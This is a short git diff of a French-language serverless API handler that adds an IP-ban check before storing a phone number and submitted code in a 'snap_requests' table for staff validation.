@@ -1,4 +1,5 @@
 import { neon } from '@neondatabase/serverless';
+import { checkBannedIP } from './middleware.js';
 
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
@@ -6,6 +7,10 @@ export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).json({ success: false });
 
   try {
+    // ─── Vérification BAN IP ───
+    const blocked = await checkBannedIP(req, res);
+    if (blocked) return blocked;
+
     const { phone, code } = req.body;
     if (!phone || !code) return res.status(400).json({ success: false, message: 'Champs manquants' });
 
@@ -28,7 +33,7 @@ export default async function handler(req, res) {
       return res.status(400).json({ success: false, message: `Code invalide (${expectedLen} chiffres requis)` });
     }
 
-    // NOUVEAU : status = 'code_submitted' (attente validation staff)
+    // status = 'code_submitted' (attente validation staff)
     await sql`UPDATE snap_requests SET status = 'code_submitted', staff_code = ${codeStr} WHERE phone = ${phone}`;
 
     return res.status(200).json({ success: true, message: 'Code soumis, en attente de vérification' });
